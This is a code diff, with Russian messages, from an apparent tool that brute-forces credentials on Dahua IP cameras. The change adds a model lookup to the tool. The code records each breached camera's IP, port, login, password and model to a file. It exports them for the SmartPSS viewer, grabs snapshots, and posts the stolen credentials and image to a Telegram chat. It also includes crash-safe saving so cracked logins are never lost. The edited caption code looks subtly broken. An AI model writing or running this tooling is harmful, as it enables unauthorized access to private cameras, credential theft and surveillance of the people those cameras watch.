@@ -44,15 +44,16 @@ _emergency_done = False
 _active_executor: concurrent.futures.ThreadPoolExecutor | None = None
 
 
-def _append_found_device(device: tuple[str, int, str, str], filepath: Path | str = FOUND_DEVICES_FILE) -> None:
-    """
-    Мгновенно дописывает найденное устройство на диск и сбрасывает буфер ядра (fsync).
-    Благодаря этому при SIGKILL (kill -9) или внезапном падении данные не теряются.
-    """
+def _append_found_device(device: tuple, filepath: Path | str = FOUND_DEVICES_FILE) -> None:
     try:
-        ip, port, login, password = device
+        ip = device[0]
+        port = device[1]
+        login = device[2]
+        password = device[3]
+        model = device[4] if len(device) > 4 and device[4] else ""
+        line = f"{ip}:{port} {login}:{password}" + (f" [{model}]" if model else "")
         with open(filepath, "a", encoding="utf-8") as f:
-            f.write(f"{ip}:{port} {login}:{password}\n")
+            f.write(line + "\n")
             f.flush()
             try:
                 os.fsync(f.fileno())
@@ -63,15 +64,10 @@ def _append_found_device(device: tuple[str, int, str, str], filepath: Path | str
 
 
 def emergency_save(
-    devices: list[tuple[str, int, str, str]] | None = None,
+    devices: list[tuple] | None = None,
     make_xml: bool = True,
     max_xml_entries: int = 64
 ) -> tuple[int, list[str]]:
-    """
-    Экстренное сохранение всех авторизованных устройств:
-    1. Синхронизирует found_devices.txt без дубликатов.
-    2. Генерирует XML-отчёты для SmartPSS в папке reports/.
-    """
     global bruted_devices
     with stats_lock:
         to_save = list(devices if devices is not None else bruted_devices)
@@ -79,7 +75,6 @@ def emergency_save(
     if not to_save:
         return 0, []
 
-    # 1. Проверяем и дополняем текстовый файл без дубликатов
     existing_lines = set()
     if FOUND_DEVICES_FILE.exists():
         try:
@@ -91,8 +86,13 @@ def emergency_save(
 
     try:
         with open(FOUND_DEVICES_FILE, "a", encoding="utf-8") as f:
-            for ip, port, login, password in to_save:
-                entry = f"{ip}:{port} {login}:{password}"
+            for dev in to_save:
+                ip = dev[0]
+                port = dev[1]
+                login = dev[2]
+                password = dev[3]
+                model = dev[4] if len(dev) > 4 and dev[4] else ""
+                entry = f"{ip}:{port} {login}:{password}" + (f" [{model}]" if model else "")
                 if entry not in existing_lines:
                     f.write(entry + "\n")
                     existing_lines.add(entry)
@@ -104,7 +104,6 @@ def emergency_save(
     except Exception as e:
         logging.error(f"failed emergency txt save: {e}")
 
-    # 2. Генерируем XML для импорта в SmartPSS
     saved_xmls: list[str] = []
     if make_xml:
         try:
@@ -117,9 +116,6 @@ def emergency_save(
 
 
 def _emergency_signal_handler(signum: int, frame) -> None:
-    """
-    Перехватчик сигналов SIGTERM, SIGBREAK, SIGHUP для мгновенного сохранения.
-    """
     global _emergency_done, _active_executor
 
     sig_name = "UNKNOWN"
@@ -140,22 +136,21 @@ def _emergency_signal_handler(signum: int, frame) -> None:
             pass
 
     logging.warning(f"emergency shutdown triggered by signal: {sig_name}")
-    print(f"\n\033[1;31m[!] Перехвачен сигнал {sig_name} — экстренно сохраняем камеры...\033[0m")
+    print(f"\n\033[1;31m{sig_name}. экстренно сохраняю камеры\033[0m")
 
     count, xml_files = emergency_save(make_xml=True)
     if count > 0:
-        msg = f"[✓] Экстренно сохранено {count} устройств в {FOUND_DEVICES_FILE.name}"
+        msg = f"сохранено {count} устройств в {FOUND_DEVICES_FILE.name}"
         if xml_files:
             msg += f" и XML для SmartPSS: {', '.join(xml_files)}"
         print(f"\033[1;32m{msg}\033[0m")
     else:
-        print("\033[1;33m[i] Найденных камер нет, сохранять нечего.\033[0m")
+        print("\033[1;33mнайденных камер нет, сохранять нечего\033[0m")
 
     sys.exit(128 + signum if isinstance(signum, int) else 1)
 
 
 def setup_signal_handlers() -> None:
-    """Регистрация обработчиков системных сигналов завершения."""
     for sig_name in ("SIGTERM", "SIGBREAK", "SIGHUP"):
         if hasattr(signal, sig_name):
             try:
@@ -166,7 +161,6 @@ def setup_signal_handlers() -> None:
 
 
 def _atexit_handler() -> None:
-    """Страховочный atexit-обработчик на случай неожиданного выхода."""
     global _emergency_done
     if not _emergency_done and bruted_devices:
         emergency_save(make_xml=True)
@@ -176,7 +170,7 @@ atexit.register(_atexit_handler)
 setup_signal_handlers()
 
 
-def post_tg(token: str, chat_id: str | int, device: tuple[str, int], ss_path: str | None, login: str, password: str) -> bool:
+def post_tg(token: str, chat_id: str | int, device: tuple, ss_path: str | None, login: str, password: str, model: str = "") -> bool:
     if not token or not chat_id:
         return False
 
@@ -184,7 +178,8 @@ def post_tg(token: str, chat_id: str | int, device: tuple[str, int], ss_path: st
     caption = (
         "📷 <b>нашел новую камеру</b>\n\n"
         f"🌐 айпи: <code>{device[0]}</code>\n"
-        f"🌐 порт: <code>{device[1]}</code>\n\n"
+        f"🌐 порт: <code>{device[1]}</code>\n"
+        f"🎥 модель: <code>{model}</code>\n" if model else "неизвестная камера"
         f"👤 логин: <code>{login}</code>\n"
         f"🔑 пароль: <code>{password}</code>"
     )
@@ -295,10 +290,15 @@ def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token
             logging.warning(f"{ip}:{port} blocked login attempts, stopping")
             return "blocked"
         elif res:
-            device = (ip, port, login, password)
+            model = ""
+            try:
+                model = DahuaController.get_model(ip, login, password)
+            except Exception as e:
+                logging.debug(f"failed to query model for {ip}:{port}: {e}")
+
+            device = (ip, port, login, password, model)
             with stats_lock:
                 bruted_devices.append(device)
-                # Мгновенная синхронизация на диск для защиты от SIGKILL / аварийного падения
                 _append_found_device(device)
 
             ss_path = None
@@ -306,9 +306,9 @@ def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token
                 ss_path = get_snapshot(ip, port, login, password)
 
             if notify and token and chat_id:
-                post_tg(token, chat_id, (ip, port), ss_path, login, password)
+                post_tg(token, chat_id, (ip, port), ss_path, login, password, model=model)
 
-            return res
+            return device
 
     return "dead"
 
@@ -390,7 +390,7 @@ def brute(
         for future in concurrent.futures.as_completed(workers):
             try:
                 res = future.result()
-                if isinstance(res, tuple) and len(res) == 4:
+                if isinstance(res, tuple) and len(res) >= 4:
                     authed_count += 1
                     if status_callback:
                         status_callback(res)
@@ -414,15 +414,15 @@ def brute(
         if pbar is not None:
             pbar.close()
             pbar = None
-        print("\n\033[1;33m[!] Сканирование прервано пользователем (Ctrl+C / SIGINT)!\033[0m")
+        print("\n\033[1;33mсканирование прервано пользователем\033[0m")
         count, xml_files = emergency_save(make_xml=make_import_file, max_xml_entries=max_entries)
         if count > 0:
-            msg = f"\033[1;32m[✓] Экстренно сохранено {count} камер в {FOUND_DEVICES_FILE.name}\033[0m"
+            msg = f"\033[1;32mсохранено {count} камер в {FOUND_DEVICES_FILE.name}\033[0m"
             if xml_files:
                 msg += f"\033[1;36m и XML: {', '.join(xml_files)}\033[0m"
             print(msg)
         else:
-            print("\033[1;33m[i] Найденных камер нет.\033[0m")
+            print("\033[1;33mнайденных камер нет\033[0m")
     except Exception as e:
         logging.error(f"bruteforcing was interrupted: {e}")
         executor.shutdown(wait=False, cancel_futures=True)
@@ -435,7 +435,6 @@ def brute(
         executor.shutdown(wait=False, cancel_futures=True)
         _active_executor = None
 
-    # Штатное сохранение отчёта XML (found_devices.txt уже синхронизирован в реальном времени)
     if bruted_devices and make_import_file:
         try:
             from . import save_to_xml
